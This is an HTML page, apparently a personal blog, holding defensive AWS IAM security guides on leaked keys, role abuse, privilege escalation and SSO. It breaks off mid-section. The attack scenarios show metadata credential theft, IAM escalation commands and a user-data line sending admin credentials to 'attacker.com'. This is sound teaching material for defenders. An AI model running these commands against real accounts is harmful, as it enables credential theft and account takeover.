<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>aws-security-best-practices // sharanch.dev</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet"/>
<style>
:root {
  --bg:#1c1c1e; --bg2:#242426; --bg3:#2a2a2d;
  --border:#333336; --border2:#3a3a3e;
  --green:#3ddc84; --green2:#2aa864; --green3:#1a6b42;
  --cyan:#5ccfe6; --yellow:#ffd580; --red:#ff6b6b; --orange:#ffb454;
  --text:#d4d4d4; --text2:#9a9aa5; --text3:#5a5a65;
  --body:#a8d8a8;
  --font:'JetBrains Mono', monospace;
}
* { margin:0; padding:0; box-sizing:border-box; }
html { scroll-behavior:smooth; }
::selection { background:#3ddc8430; }
::-webkit-scrollbar { width:5px; }
::-webkit-scrollbar-track { background:var(--bg); }
::-webkit-scrollbar-thumb { background:var(--border2); border-radius:3px; }

body {
  background:#030712; color:var(--text);
  font-family:var(--font); font-size:13px; line-height:1.7;
  min-height:100vh; background:#030712;
}

.window {
  max-width:1000px; margin:32px auto;
  border-radius:10px; overflow:hidden;
  border:1px solid var(--border);
  box-shadow:0 40px 100px #00000090, 0 0 0 1px #ffffff06;
}

.titlebar {
  background:#252527; padding:11px 16px;
  display:flex; align-items:center; gap:8px;
  border-bottom:1px solid var(--border);
  position:sticky; top:0; z-index:100;
}
.dot { width:12px; height:12px; border-radius:50%; flex-shrink:0; }
.dot-r { background:#ff5f57; }
.dot-y { background:#febc2e; }
.dot-g { background:#28c840; }
.titlebar-path {
  margin-left:8px; color:var(--text2); font-size:11px;
  letter-spacing:.04em; overflow:hidden; white-space:nowrap; text-overflow:ellipsis;
}
.titlebar-path .seg { color:var(--green); }
.titlebar-path .sep { color:var(--text3); margin:0 2px; }

.term { padding:28px 36px 48px; background:var(--bg); }

/* Prompt */
.prompt { color:var(--green); font-weight:700; user-select:none; }
.cmdline { display:flex; align-items:baseline; margin-bottom:8px; gap:4px; flex-wrap:wrap; }
.cmd { color:var(--text); }
.cmd .p { color:var(--cyan); }
.cmd .s { color:var(--yellow); }
.cmd .f { color:var(--orange); }
.output { margin-bottom:32px; }

/* Hero */
.hero-title { font-size:26px; font-weight:700; color:#fff; margin:10px 0 4px; letter-spacing:-.5px; }
.hero-sub   { color:var(--green); font-size:13px; margin-bottom:16px; }
.hero-body  { color:var(--body); line-height:1.85; max-width:680px; margin-bottom:20px; }
.badges     { display:flex; flex-wrap:wrap; gap:7px; }
.badge { padding:2px 9px; border-radius:3px; font-size:10px; font-weight:500;
         letter-spacing:.08em; text-transform:uppercase; border:1px solid; }
.bg { color:var(--green);  border-color:#3ddc8435; background:#3ddc8410; }
.bc { color:var(--cyan);   border-color:#5ccfe635; background:#5ccfe610; }
.by { color:var(--yellow); border-color:#ffd58035; background:#ffd58010; }

hr.div { border:none; border-top:1px solid var(--border); margin:28px 0; }

/* Stats */
.stats     { display:flex; gap:28px; flex-wrap:wrap; }
.stat-n    { font-size:26px; font-weight:700; color:var(--green); line-height:1; }
.stat-l    { font-size:10px; color:var(--text2); letter-spacing:.1em; text-transform:uppercase; }

/* Section grid */
.sec-label { font-size:10px; color:var(--text3); letter-spacing:.15em; text-transform:uppercase; margin-bottom:14px; }
.grid      { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:10px; }

.card {
  background:var(--bg2); border:1px solid var(--border);
  border-radius:6px; padding:15px 17px; cursor:pointer;
  transition:border-color .15s, background .15s, transform .1s;
  text-align:left; width:100%;
}
.card:hover  { border-color:var(--green2); background:var(--bg3); transform:translateY(-1px); }
.card:active { transform:translateY(0); }
.card-num   { color:var(--text3); font-size:10px; margin-bottom:3px; }
.card-title { color:var(--green); font-weight:700; font-size:13px; margin-bottom:5px; }
.card-desc  { color:var(--text2); font-size:11px; line-height:1.6; }
.card-tags  { display:flex; flex-wrap:wrap; gap:4px; margin-top:9px; }
.ctag { font-size:9px; color:var(--cyan); border:1px solid #5ccfe622;
        padding:1px 5px; border-radius:2px; background:#5ccfe608; }

/* Section view */
.section-title  { font-size:18px; font-weight:700; color:#fff; margin:8px 0 6px; }
.section-intro  { color:var(--body); line-height:1.8; max-width:700px; margin-bottom:16px; }

/* Doc list */
.doc-list { display:flex; flex-direction:column; gap:8px; }
.doc-card {
  background:var(--bg2); border:1px solid var(--border);
  border-radius:6px; padding:13px 17px; cursor:pointer;
  transition:border-color .15s, background .15s;
  display:flex; align-items:center; justify-content:space-between;
  text-align:left; width:100%;
}
.doc-card:hover      { border-color:var(--cyan); background:var(--bg3); }
.doc-card-title      { color:var(--cyan); font-size:13px; font-weight:500; }
.doc-card-slug       { color:var(--text3); font-size:11px; margin-top:2px; }
.doc-arrow           { color:var(--text3); font-size:13px; transition:color .15s; flex-shrink:0; }
.doc-card:hover .doc-arrow { color:var(--cyan); }

/* Back button */
.back-btn {
  background:none; border:1px solid var(--border);
  color:var(--text2); padding:5px 12px; border-radius:4px;
  cursor:pointer; font-family:var(--font); font-size:11px;
  transition:border-color .15s, color .15s; margin-bottom:20px;
  display:inline-flex; align-items:center; gap:5px;
}
.back-btn:hover { border-color:var(--green); color:var(--green); }

/* Prev/next row */
.nav-row { display:flex; gap:10px; flex-wrap:wrap; margin-top:24px; }

/* Markdown */
.md h1 { font-size:20px; font-weight:700; color:#fff; margin:24px 0 12px;
         padding-bottom:8px; border-bottom:1px solid var(--border); }
.md h1:first-child { margin-top:0; }
.md h2 { font-size:14px; font-weight:700; color:var(--green); margin:28px 0 10px; }
.md h3 { font-size:13px; font-weight:700; color:var(--cyan); margin:20px 0 8px; }
.md p  { color:var(--body); margin-bottom:12px; line-height:1.85; }
.md ul, .md ol { color:var(--body); margin-bottom:12px; padding-left:20px; }
.md li { margin-bottom:4px; line-height:1.75; }
.md li input[type=checkbox] { accent-color:var(--green); margin-right:6px; }
.md strong { color:var(--text); font-weight:700; }
.md a { color:var(--cyan); text-decoration:none; }
.md a:hover { text-decoration:underline; }
.md hr { border:none; border-top:1px solid var(--border); margin:20px 0; }

.md code {
  background:#141416; color:var(--yellow);
  padding:1px 5px; border-radius:3px; font-family:var(--font); font-size:12px;
}
.md pre {
  background:#141416; border:1px solid var(--border);
  border-radius:6px; padding:16px 20px; margin:12px 0;
  overflow-x:auto; line-height:1.75;
}
.md pre code { background:none; padding:0; color:var(--text); font-size:12px; }
.md pre .cm  { color:var(--text3); }
.md pre .ck  { color:var(--cyan); }
.md pre .cs  { color:var(--yellow); }
.md pre .cg  { color:var(--green); }
.md pre .cr  { color:var(--red); }
.md pre .cw  { color:var(--orange); }

.md table { border-collapse:collapse; width:100%; margin:12px 0; }
.md th { color:var(--green); font-weight:700; text-align:left;
         padding:7px 12px; border-bottom:1px solid var(--border2);
         font-size:11px; letter-spacing:.06em; text-transform:uppercase; }
.md td { color:var(--body); padding:7px 12px; border-bottom:1px solid var(--border); font-size:12px; }
.md tr:last-child td { border-bottom:none; }
.md tr:hover td { background:var(--bg2); }

.md blockquote {
  border-left:3px solid var(--green3); padding:8px 16px; margin:12px 0;
  background:#1a2a1a; border-radius:0 4px 4px 0;
}
.md blockquote p { color:var(--text2); margin:0; }

/* Cursor */
.cursor {
  display:inline-block; width:8px; height:14px;
  background:var(--green); vertical-align:middle;
  animation:blink 1.1s step-end infinite; margin-left:2px;
}
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }

/* Fade in */
@keyframes fadeIn { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:none} }
.fade { animation:fadeIn .2s ease forwards; }

/* Footer links */
.footer-links { display:flex; gap:20px; flex-wrap:wrap; }
.flink { color:var(--cyan); font-size:12px; text-decoration:none; transition:color .15s; }
.flink:hover { color:#fff; }
.flink::before { content:"-> "; color:var(--green2); }

@media(max-width:680px){
  .window { margin:0; border-radius:0; }
  .term   { padding:18px 18px 40px; }
  .grid   { grid-template-columns:1fr; }
  .stats  { gap:16px; }
}
</style>
</head>

<script>
const SECTIONS = JSON.parse("[{\"id\": \"01-iam-credentials\", \"num\": \"01\", \"name\": \"IAM &amp; Credentials\", \"readme\": \"# 01 \\u2014 IAM & Credentials\\n\\nIAM is the front door to your entire AWS account. Misconfigured IAM is the root cause of the majority of AWS breaches.\\n\\n## Topics\\n\\n| File | Topic |\\n|------|-------|\\n| [01-static-keys.md](./01-static-keys.md) | Risks of static access keys and how to eliminate them |\\n| [02-role-abuse.md](./02-role-abuse.md) | How IAM roles get abused and how to lock them down |\\n| [03-privilege-escalation.md](./03-privilege-escalation.md) | IAM privilege escalation paths and how to detect them |\\n| [04-identity-center.md](./04-identity-center.md) | Setting up IAM Identity Center (SSO) for human users |\\n\\n## Key Threat Model\\n\\n```\\nStatic Keys Leaked          Role Misconfigured         Weak Trust Policy\\n       \\u2502                           \\u2502                          \\u2502\\n       \\u25bc                           \\u25bc                          \\u25bc\\nAttacker has permanent      Attacker assumes role      Cross-account takeover\\naccess to your account      from compromised EC2       from any AWS account\\n```\\n\\n## Top 5 IAM Controls (Do These First)\\n\\n1. Delete all root account access keys\\n2. Enable MFA on all IAM users, especially admin group\\n3. Replace static access keys with IAM Identity Center (SSO)\\n4. Apply SCPs to prevent disabling CloudTrail and GuardDuty\\n5. Run IAM Access Analyzer to find overly permissive policies\\n\", \"docs\": [{\"slug\": \"01-static-keys\", \"title\": \"Static Access Keys \\u2014 Risks and Elimination\", \"content\": \"# Static Access Keys \\u2014 Risks and Elimination\\n\\n## The Problem\\n\\nStatic access keys (`AKIA...`) are permanent credentials \\u2014 they never expire unless manually rotated or deleted. A leaked key gives an attacker indefinite access to your AWS account.\\n\\n---\\n\\n## How Keys Get Leaked\\n\\n### 1. Committed to Git\\n```bash\\n# Common patterns bots scan for on GitHub within seconds of a push\\nAWS_ACCESS_KEY_ID=AKIA...\\nAWS_SECRET_ACCESS_KEY=...\\n\\n# Found in: .env files, application configs, hardcoded in source\\n```\\n\\n### 2. Exposed in CI/CD Logs\\n```bash\\n# Accidentally printed in a build step\\necho \\\"Deploying with key: $AWS_ACCESS_KEY_ID\\\"\\n\\n# Or passed as a plain argument instead of a secret\\naws s3 cp file.txt s3://bucket --access-key AKIA... --secret-key ...\\n```\\n\\n### 3. Sitting in ~/.aws/credentials on a Compromised Laptop\\n```bash\\n# Any malware or attacker with shell access reads this instantly\\ncat ~/.aws/credentials\\n\\n[default]\\naws_access_key_id = AKIA...\\naws_secret_access_key = ...\\n```\\n\\n---\\n\\n## Detection \\u2014 Audit Your Account\\n\\n```bash\\n# 1. Generate a credential report for all IAM users\\naws iam generate-credential-report\\n\\n# 2. Download and decode it\\naws iam get-credential-report \\\\\\n  --query 'Content' \\\\\\n  --output text | base64 -d > credential-report.csv\\n\\n# 3. Find users with active access keys\\ncat credential-report.csv | cut -d',' -f1,9,14 | grep 'true'\\n# Columns: username, access_key_1_active, access_key_2_active\\n\\n# 4. Check when keys were last used\\naws iam get-access-key-last-used --access-key-id AKIAIOSFODNN7EXAMPLE\\n\\n# 5. List all access keys for a specific user\\naws iam list-access-keys --user-name sharan\\n```\\n\\n---\\n\\n## Detection \\u2014 Check for Leaked Keys\\n\\n```bash\\n# Check if a key has been used recently from an unexpected region\\naws cloudtrail lookup-events \\\\\\n  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE \\\\\\n  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \\\\\\n  --query 'Events[*].[EventTime,EventName,AwsRegion,SourceIPAddress]' \\\\\\n  --output table\\n\\n# Check root account access key status (should always be 0)\\naws iam get-account-summary \\\\\\n  --query 'SummaryMap.AccountAccessKeysPresent'\\n```\\n\\n---\\n\\n## Immediate Response \\u2014 Key Compromised\\n\\n```bash\\n# Step 1 \\u2014 Deactivate immediately (do NOT delete yet \\u2014 needed for forensics)\\naws iam update-access-key \\\\\\n  --access-key-id AKIAIOSFODNN7EXAMPLE \\\\\\n  --status Inactive \\\\\\n  --user-name compromised-user\\n\\n# Step 2 \\u2014 Attach a deny-all policy to kill all active sessions\\naws iam put-user-policy \\\\\\n  --user-name compromised-user \\\\\\n  --policy-name EmergencyDenyAll \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Deny\\\",\\n      \\\"Action\\\": \\\"*\\\",\\n      \\\"Resource\\\": \\\"*\\\"\\n    }]\\n  }'\\n\\n# Step 3 \\u2014 Check what the key did via CloudTrail\\naws cloudtrail lookup-events \\\\\\n  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAIOSFODNN7EXAMPLE \\\\\\n  --query 'Events[*].[EventTime,EventName,AwsRegion,SourceIPAddress,Username]' \\\\\\n  --output table\\n\\n# Step 4 \\u2014 Check for backdoor users or keys created\\naws iam list-users --query 'Users[*].[UserName,CreateDate]' --output table\\naws iam list-roles --query 'Roles[*].[RoleName,CreateDate]' --output table\\n\\n# Step 5 \\u2014 After forensics, delete the key\\naws iam delete-access-key \\\\\\n  --access-key-id AKIAIOSFODNN7EXAMPLE \\\\\\n  --user-name compromised-user\\n```\\n\\n---\\n\\n## Prevention \\u2014 Eliminate Static Keys\\n\\n### Option 1: Enforce key rotation via IAM policy\\n```bash\\n# Deny API calls if key is older than 90 days\\n# Add this to your IAM policy\\ncat <<'EOF'\\n{\\n  \\\"Effect\\\": \\\"Deny\\\",\\n  \\\"Action\\\": \\\"*\\\",\\n  \\\"Resource\\\": \\\"*\\\",\\n  \\\"Condition\\\": {\\n    \\\"NumericGreaterThan\\\": {\\n      \\\"aws:credentials-age\\\": \\\"90\\\"\\n    }\\n  }\\n}\\nEOF\\n```\\n\\n### Option 2: Move to IAM Identity Center (recommended)\\n```bash\\n# Install AWS CLI v2 with SSO support\\naws configure sso\\n\\n# Login \\u2014 opens browser, MFA prompt, returns temp credentials\\naws sso login --profile my-profile\\n\\n# Credentials auto-expire (1-8 hrs), no static keys needed\\naws sts get-caller-identity --profile my-profile\\n```\\n\\n### Option 3: Use git-secrets to prevent accidental commits\\n```bash\\n# Install git-secrets\\ngit secrets --install\\ngit secrets --register-aws\\n\\n# Now any commit containing AWS key patterns is blocked\\ngit commit -m \\\"add config\\\"\\n# ERROR: Potential AWS access key found\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] Root account has zero active access keys\\n- [ ] All IAM user keys rotated within last 90 days\\n- [ ] Keys unused for 90+ days are deactivated/deleted\\n- [ ] `git-secrets` or `trufflehog` installed in pre-commit hooks\\n- [ ] CloudTrail enabled to log all key usage\\n- [ ] GuardDuty enabled \\u2014 detects anomalous key usage automatically\\n- [ ] Working toward full elimination via IAM Identity Center\\n\"}, {\"slug\": \"02-role-abuse\", \"title\": \"IAM Role Abuse\", \"content\": \"# IAM Role Abuse\\n\\n## The Problem\\n\\nIAM roles grant temporary credentials to AWS services, users, or external identities. When role trust policies are too permissive or roles are over-privileged, attackers can assume them to escalate access.\\n\\n---\\n\\n## Attack Scenarios\\n\\n### Scenario 1 \\u2014 EC2 Instance Role Credential Theft\\n```bash\\n# Attacker with shell access on an EC2 instance runs:\\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\\n# Returns role name, e.g.: MyAppRole\\n\\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole\\n# Returns:\\n# {\\n#   \\\"AccessKeyId\\\": \\\"ASIA...\\\",\\n#   \\\"SecretAccessKey\\\": \\\"...\\\",\\n#   \\\"Token\\\": \\\"...\\\",\\n#   \\\"Expiration\\\": \\\"...\\\"\\n# }\\n\\n# Attacker exports these and uses them from their own machine\\nexport AWS_ACCESS_KEY_ID=ASIA...\\nexport AWS_SECRET_ACCESS_KEY=...\\nexport AWS_SESSION_TOKEN=...\\naws s3 ls  # Works from anywhere until TTL expires\\n```\\n\\n### Scenario 2 \\u2014 Overly Permissive Trust Policy\\n```json\\n// Dangerous: Any AWS account can assume this role\\n{\\n  \\\"Effect\\\": \\\"Allow\\\",\\n  \\\"Principal\\\": {\\n    \\\"AWS\\\": \\\"arn:aws:iam::*:root\\\"\\n  },\\n  \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n}\\n```\\n\\n### Scenario 3 \\u2014 Role Chaining for Privilege Escalation\\n```bash\\n# Attacker assumes Role A (low privilege)\\naws sts assume-role \\\\\\n  --role-arn arn:aws:iam::123456789:role/LowPrivRole \\\\\\n  --role-session-name attacker-session\\n\\n# Role A has sts:AssumeRole on Role B (high privilege)\\naws sts assume-role \\\\\\n  --role-arn arn:aws:iam::123456789:role/AdminRole \\\\\\n  --role-session-name escalated-session\\n# Now attacker has admin access\\n```\\n\\n---\\n\\n## Detection\\n\\n```bash\\n# 1. Find roles with wildcard Principal in trust policy\\naws iam list-roles --query 'Roles[*].RoleName' --output text | \\\\\\n  tr '\\\\t' '\\\\n' | while read role; do\\n    trust=$(aws iam get-role --role-name \\\"$role\\\" \\\\\\n      --query 'Role.AssumeRolePolicyDocument' --output json)\\n    if echo \\\"$trust\\\" | grep -q '\\\"AWS\\\": \\\"\\\\*\\\"'; then\\n      echo \\\"DANGEROUS TRUST POLICY: $role\\\"\\n    fi\\n  done\\n\\n# 2. Find roles that can be assumed by all AWS services\\naws iam list-roles \\\\\\n  --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal==`\\\"*\\\"`]].RoleName'\\n\\n# 3. Monitor AssumeRole calls in CloudTrail\\naws cloudtrail lookup-events \\\\\\n  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \\\\\\n  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \\\\\\n  --query 'Events[*].[EventTime,Username,SourceIPAddress]' \\\\\\n  --output table\\n\\n# 4. Find roles with AdministratorAccess attached\\naws iam list-entities-for-policy \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \\\\\\n  --entity-filter Role \\\\\\n  --query 'PolicyRoles[*].RoleName'\\n```\\n\\n---\\n\\n## Prevention\\n\\n### 1. Enforce IMDSv2 to Block Credential Theft from EC2\\n```bash\\n# Enforce on a running instance\\naws ec2 modify-instance-metadata-options \\\\\\n  --instance-id i-0123456789abcdef0 \\\\\\n  --http-tokens required \\\\\\n  --http-endpoint enabled\\n\\n# Verify\\naws ec2 describe-instances \\\\\\n  --instance-ids i-0123456789abcdef0 \\\\\\n  --query 'Reservations[*].Instances[*].MetadataOptions'\\n\\n# Enforce org-wide via AWS Config rule\\naws configservice put-config-rule --config-rule '{\\n  \\\"ConfigRuleName\\\": \\\"ec2-imdsv2-check\\\",\\n  \\\"Source\\\": {\\n    \\\"Owner\\\": \\\"AWS\\\",\\n    \\\"SourceIdentifier\\\": \\\"EC2_IMDSV2_REQUIRED\\\"\\n  }\\n}'\\n```\\n\\n### 2. Tighten Trust Policies \\u2014 Always Specify Exact Principal\\n```bash\\n# Check trust policy for a role\\naws iam get-role \\\\\\n  --role-name MyRole \\\\\\n  --query 'Role.AssumeRolePolicyDocument'\\n\\n# Update trust policy to restrict principal\\naws iam update-assume-role-policy \\\\\\n  --role-name MyRole \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"AWS\\\": \\\"arn:aws:iam::123456789012:role/SpecificRole\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\",\\n      \\\"Condition\\\": {\\n        \\\"StringEquals\\\": {\\n          \\\"sts:ExternalId\\\": \\\"unique-external-id-12345\\\"\\n        }\\n      }\\n    }]\\n  }'\\n```\\n\\n### 3. Use Permission Boundaries to Cap Role Privileges\\n```bash\\n# Create a permission boundary\\naws iam create-policy \\\\\\n  --policy-name MaxPermissionBoundary \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Action\\\": [\\\"s3:GetObject\\\", \\\"s3:PutObject\\\"],\\n      \\\"Resource\\\": \\\"arn:aws:s3:::my-app-bucket/*\\\"\\n    }]\\n  }'\\n\\n# Attach boundary to role \\u2014 role can NEVER exceed this even if policy says otherwise\\naws iam put-role-permissions-boundary \\\\\\n  --role-name MyAppRole \\\\\\n  --permissions-boundary arn:aws:iam::123456789:policy/MaxPermissionBoundary\\n```\\n\\n### 4. SCP \\u2014 Prevent Roles from Being Created Without Boundaries\\n```json\\n// Attach this SCP to your AWS Organization\\n{\\n  \\\"Effect\\\": \\\"Deny\\\",\\n  \\\"Action\\\": [\\\"iam:CreateRole\\\", \\\"iam:PutRolePolicy\\\"],\\n  \\\"Resource\\\": \\\"*\\\",\\n  \\\"Condition\\\": {\\n    \\\"StringNotLike\\\": {\\n      \\\"iam:PermissionsBoundary\\\": \\\"arn:aws:iam::*:policy/MaxPermissionBoundary\\\"\\n    }\\n  }\\n}\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] No roles with `Principal: \\\"*\\\"` in trust policy\\n- [ ] Cross-account role assumptions use `sts:ExternalId`\\n- [ ] Permission boundaries applied to all non-service roles\\n- [ ] IMDSv2 enforced on all EC2 instances\\n- [ ] CloudTrail alerting on unexpected `AssumeRole` calls\\n- [ ] IAM Access Analyzer enabled in all regions\\n\"}, {\"slug\": \"03-privilege-escalation\", \"title\": \"IAM Privilege Escalation\", \"content\": \"# IAM Privilege Escalation\\n\\n## The Problem\\n\\nCertain IAM permissions, when granted carelessly, allow an attacker to escalate their own privileges to admin \\u2014 even from a low-privilege starting point.\\n\\n---\\n\\n## Common Escalation Paths\\n\\n### Path 1 \\u2014 `iam:AttachRolePolicy`\\n```bash\\n# Attacker has a role with iam:AttachRolePolicy permission\\n# They attach AdministratorAccess to their own role\\n\\naws iam attach-role-policy \\\\\\n  --role-name AttackerRole \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n\\n# Now AttackerRole has full admin access\\n```\\n\\n### Path 2 \\u2014 `iam:CreatePolicyVersion`\\n```bash\\n# Attacker creates a new version of an existing policy with * permissions\\naws iam create-policy-version \\\\\\n  --policy-arn arn:aws:iam::123456789:policy/MyPolicy \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]\\n  }' \\\\\\n  --set-as-default\\n# Policy now grants everything\\n```\\n\\n### Path 3 \\u2014 `iam:PassRole` + `ec2:RunInstances`\\n```bash\\n# Attacker launches a new EC2 with an admin role attached\\naws ec2 run-instances \\\\\\n  --image-id ami-12345678 \\\\\\n  --instance-type t3.micro \\\\\\n  --iam-instance-profile Name=AdminInstanceProfile \\\\\\n  --user-data '#!/bin/bash\\n    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole \\\\\\n    | curl -X POST -d @- https://attacker.com/steal'\\n# EC2 starts, sends admin credentials to attacker's server\\n```\\n\\n### Path 4 \\u2014 `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`\\n```bash\\n# Create a Lambda with an admin execution role\\naws lambda create-function \\\\\\n  --function-name backdoor \\\\\\n  --runtime python3.11 \\\\\\n  --role arn:aws:iam::123456789:role/AdminRole \\\\\\n  --handler index.handler \\\\\\n  --zip-file fileb://backdoor.zip\\n\\n# Invoke it \\u2014 Lambda runs as admin role\\naws lambda invoke --function-name backdoor output.json\\n```\\n\\n---\\n\\n## Detection\\n\\n```bash\\n# 1. Find all users/roles with dangerous IAM permissions\\nDANGEROUS_ACTIONS=(\\n  \\\"iam:AttachRolePolicy\\\"\\n  \\\"iam:CreatePolicyVersion\\\"\\n  \\\"iam:PassRole\\\"\\n  \\\"iam:PutRolePolicy\\\"\\n  \\\"iam:UpdateAssumeRolePolicy\\\"\\n  \\\"sts:AssumeRole\\\"\\n)\\n\\n# Check policies attached to a user for these actions\\naws iam list-attached-user-policies --user-name target-user\\naws iam list-user-policies --user-name target-user\\n\\n# 2. Run IAM Access Analyzer to find privilege escalation risks\\naws accessanalyzer create-analyzer \\\\\\n  --analyzer-name my-analyzer \\\\\\n  --type ACCOUNT\\n\\naws accessanalyzer list-findings \\\\\\n  --analyzer-name my-analyzer \\\\\\n  --query 'findings[?status==`ACTIVE`].[id,resourceType,condition]' \\\\\\n  --output table\\n\\n# 3. Detect policy changes in CloudTrail\\naws cloudtrail lookup-events \\\\\\n  --lookup-attributes AttributeKey=EventName,AttributeValue=AttachRolePolicy \\\\\\n  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \\\\\\n  --query 'Events[*].[EventTime,Username,CloudTrailEvent]' \\\\\\n  --output table\\n\\n# Check for other high-risk events\\nfor event in PutRolePolicy CreatePolicyVersion UpdateAssumeRolePolicy AddUserToGroup; do\\n  echo \\\"=== Checking $event ===\\\"\\n  aws cloudtrail lookup-events \\\\\\n    --lookup-attributes AttributeKey=EventName,AttributeValue=$event \\\\\\n    --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \\\\\\n    --query 'Events[*].[EventTime,Username]' \\\\\\n    --output table\\ndone\\n```\\n\\n---\\n\\n## Prevention\\n\\n### 1. Never Grant Broad IAM Permissions \\u2014 Scope Tightly\\n```bash\\n# Bad \\u2014 allows attaching any policy to any role\\n{\\n  \\\"Effect\\\": \\\"Allow\\\",\\n  \\\"Action\\\": \\\"iam:AttachRolePolicy\\\",\\n  \\\"Resource\\\": \\\"*\\\"\\n}\\n\\n# Good \\u2014 restrict to specific roles and specific policies only\\n{\\n  \\\"Effect\\\": \\\"Allow\\\",\\n  \\\"Action\\\": \\\"iam:AttachRolePolicy\\\",\\n  \\\"Resource\\\": \\\"arn:aws:iam::123456789:role/specific-role\\\",\\n  \\\"Condition\\\": {\\n    \\\"ArnEquals\\\": {\\n      \\\"iam:PolicyARN\\\": \\\"arn:aws:iam::123456789:policy/allowed-policy\\\"\\n    }\\n  }\\n}\\n```\\n\\n### 2. SCP \\u2014 Deny Dangerous IAM Actions Org-Wide\\n```bash\\naws organizations create-policy \\\\\\n  --name BlockPrivEscalation \\\\\\n  --type SERVICE_CONTROL_POLICY \\\\\\n  --description \\\"Block IAM privilege escalation paths\\\" \\\\\\n  --content '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [{\\n      \\\"Effect\\\": \\\"Deny\\\",\\n      \\\"Action\\\": [\\n        \\\"iam:CreatePolicyVersion\\\",\\n        \\\"iam:SetDefaultPolicyVersion\\\",\\n        \\\"iam:AttachRolePolicy\\\",\\n        \\\"iam:PutRolePolicy\\\",\\n        \\\"iam:UpdateAssumeRolePolicy\\\"\\n      ],\\n      \\\"Resource\\\": \\\"*\\\",\\n      \\\"Condition\\\": {\\n        \\\"StringNotLike\\\": {\\n          \\\"aws:PrincipalArn\\\": \\\"arn:aws:iam::*:role/SecurityAdminRole\\\"\\n        }\\n      }\\n    }]\\n  }'\\n```\\n\\n### 3. Enable GuardDuty \\u2014 Detects Privilege Escalation Attempts\\n```bash\\n# Enable GuardDuty in all regions\\naws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES\\n\\n# GuardDuty automatically detects:\\n# - Policy:IAMUser/RootCredentialUsage\\n# - PrivilegeEscalation:IAMUser/AdministrativePermissions\\n# - Persistence:IAMUser/UserPermissions\\n```\\n\\n---\\n\\n## High-Risk Permissions Reference\\n\\n| Permission | Escalation Method |\\n|---|---|\\n| `iam:AttachRolePolicy` | Attach AdministratorAccess to own role |\\n| `iam:CreatePolicyVersion` | Overwrite existing policy with `*:*` |\\n| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |\\n| `iam:PassRole` + `lambda:CreateFunction` | Deploy Lambda with admin role |\\n| `iam:CreateAccessKey` | Create keys for another admin user |\\n| `iam:UpdateLoginProfile` | Reset another user's console password |\\n| `sts:AssumeRole` on `*` | Assume any role in the account |\\n\\n---\\n\\n## Checklist\\n\\n- [ ] No user or role has `iam:*` or `*:*` unless absolutely necessary\\n- [ ] `iam:PassRole` is scoped to specific roles only\\n- [ ] SCPs block privilege escalation actions org-wide\\n- [ ] IAM Access Analyzer enabled and findings reviewed weekly\\n- [ ] CloudWatch alarms on `AttachRolePolicy`, `CreatePolicyVersion`, `PutRolePolicy`\\n- [ ] GuardDuty enabled across all regions\\n\"}, {\"slug\": \"04-identity-center\", \"title\": \"IAM Identity Center (SSO)\", \"content\": \"# IAM Identity Center (SSO)\\n\\n## Why Identity Center\\n\\nStatic access keys (`AKIA...`) are permanent, easy to leak, and bypass MFA. IAM Identity Center replaces them with short-lived credentials vended per-session \\u2014 after the user authenticates with MFA.\\n\\n```\\nStatic Keys                     Identity Center\\n\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500                     \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\nAKIA... (never expires)    vs   ASIA... (expires in 1-8 hrs)\\nNo MFA on API calls             MFA baked into login\\n~/.aws/credentials file         Cached temp creds only\\nOne breach = permanent access   Breach = useless after TTL\\n```\\n\\n---\\n\\n## How It Works\\n\\n```\\nDeveloper runs: aws sso login\\n        \\u2502\\n        \\u25bc\\nBrowser opens \\u2192 company SSO page (Okta / Azure AD / native)\\n        \\u2502\\n        \\u25bc\\nDeveloper 